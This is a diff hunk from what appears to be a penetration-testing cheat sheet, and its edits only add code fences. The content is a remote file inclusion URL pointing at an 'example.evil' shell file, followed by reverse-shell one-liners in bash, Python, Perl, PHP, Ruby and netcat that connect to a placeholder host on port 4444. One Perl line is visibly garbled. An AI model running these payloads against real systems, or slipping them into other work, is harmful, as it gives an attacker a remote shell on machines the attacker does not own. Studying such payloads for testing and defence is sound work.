@@ -171,26 +171,32 @@ http://example.com/index.php?page=http://example.evil/shell.txt%00
 bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
 /bin/bash -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
 /bin/sh -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
+```
 
-#Python
+```Python
 python -c 'import
 socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
-#Perl
+```Perl
 perl -e 'use
 Socket;$i="x.x.x.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
 {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh-i");};'
 
 #Perl Windows
 perl -MIO -e '$c=new IO :: Socket :: INET(PeerAddr,"x.x.x.x:4444");STDIN->fdopen($c,r);$ ~- >fdopen($c,w);system$_ while<>;'
+```
 
-#PHP
+```PHP
 php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 
-#Ruby
+```Ruby
 ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
 
+```bash
 #Netcat
 nc -e /bin/sh x.x.x.x 4444
 nc -e cmd.exe x.x.x.x 4444
